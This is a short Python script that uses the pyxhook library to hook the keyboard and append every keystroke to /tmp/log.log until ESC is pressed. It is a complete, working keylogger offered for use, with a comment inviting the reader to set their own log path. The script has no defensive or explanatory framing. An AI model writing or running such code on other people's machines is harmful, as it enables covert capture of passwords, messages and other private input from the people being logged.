import pyxhook
#change this to your log file's path
log_file='/tmp/log.log'

#this function is called everytime a key is pressed.
def OnKeyPress(event):
  fob=open(log_file,'a')
  if (event.Key == 'space'):
    fob.write(' ')
  else:
    fob.write(event.Key)
  #fob.write('\n')

  if event.Ascii==27: #27 is the ascii value of ESC key
    fob.close()
    new_hook.cancel()
#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()